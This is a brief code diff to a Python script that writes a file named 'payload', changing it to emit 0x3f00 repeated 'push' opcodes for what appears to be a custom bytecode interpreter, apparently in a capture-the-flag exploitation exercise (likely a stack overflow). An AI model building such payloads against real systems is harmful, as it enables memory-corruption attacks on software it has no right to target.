@@ -26,7 +26,8 @@ with open('payload', 'wb') as f:
 
     # program
     program = b""
-    program += p8(0x01)
+    for i in range(0x3f00):
+        program += p8(0x01)  # push
     program += p8(0x00)
     f.write(p32(len(program)))
     f.write(program)
